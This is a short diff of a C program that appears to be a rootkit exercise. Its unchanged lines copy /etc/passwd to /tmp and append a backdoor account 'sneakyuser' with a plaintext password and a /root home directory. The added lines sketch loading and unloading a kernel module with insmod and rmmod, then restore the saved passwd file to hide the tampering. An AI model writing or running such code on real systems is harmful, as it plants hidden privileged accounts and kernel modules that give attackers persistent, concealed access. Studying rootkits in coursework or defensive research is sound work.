@@ -8,6 +8,11 @@ int main() {
     system("cp /etc/passwd /tmp/passwd");
     system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
 
+    //load .ko - insmod
+    //loop
+    //unload module - rmmod
+
+    system("cp /tmp/passwd /etc/passwd");
 
     return EXIT_SUCCESS;
 }
